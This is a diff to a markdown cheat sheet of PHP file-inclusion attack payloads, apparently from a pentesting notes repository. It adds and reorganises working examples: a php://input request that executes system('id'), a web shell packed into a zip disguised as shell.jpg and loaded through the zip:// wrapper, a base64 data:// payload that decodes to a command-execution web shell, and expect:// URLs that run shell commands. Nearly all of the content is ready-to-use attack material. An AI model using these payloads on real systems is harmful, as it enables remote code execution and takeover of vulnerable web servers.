@@ -154,30 +154,41 @@ http://example.com/index.php?page=php://filter/convert.iconv.utf-8.utf-16/resour
 ```
 > Wrappers Commands Excute :
 
-  > LFI Wrapper ZIP :
++ Simple input for excute commands
 
-  ```
-  echo "</pre><?php system($_GET['cmd']); ?></pre>" > payload.php;  
-  zip payload.zip payload.php;   
-  mv payload.zip shell.jpg;    
-  rm payload.php   
+```
+http://example.com/index.php?page=php://input
+  ... Host: localhost:8081
+  ... Content-Length: 25
+  ...
+<?php system("id"); ?>
+```
+
++ LFI Wrapper ZIP :
+
+```
+echo "</pre><?php system($_GET['cmd']); ?></pre>" > payload.php;  
+zip payload.zip payload.php;   
+mv payload.zip shell.jpg;    
+rm payload.php   
   
-  http://example.com/index.php?page=zip://shell.jpg%23payload.php
-  ```
+http://example.com/index.php?page=zip://shell.jpg%23payload.php
+```
 
-  > RFI Wrapper DATA with "" payload :
++ RFI Wrapper DATA - payload encoded base64 :
 
-  ```
-  http://example.net/?page=data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ZWNobyAnU2hlbGwgZG9uZSAhJzsgPz4=
-  ```
+```
+http://example.net/?page=data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ZWNobyAnU2hlbGwgZG9uZSAhJzsgPz4=
+<?php system($_GET['cmd']);echo 'Shell done !'; ?> -> PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ZWNobyAnU2hlbGwgZG9uZSAhJzsgPz4=
 
-  > **RFI Wrapper EXPECT** :
+```
 
-  + Allow to excute commands
-  ```
-  http://example.com/index.php?page=php:expect://id
-  http://example.com/index.php?page=php:expect://ls
-  ```
++ RFI Wrapper EXPECT :
+
+```
+http://example.com/index.php?page=php:expect://id
+http://example.com/index.php?page=php:expect://ls
+```
 
 #### [+] XSS via RFI/LFI with "" payload :
 
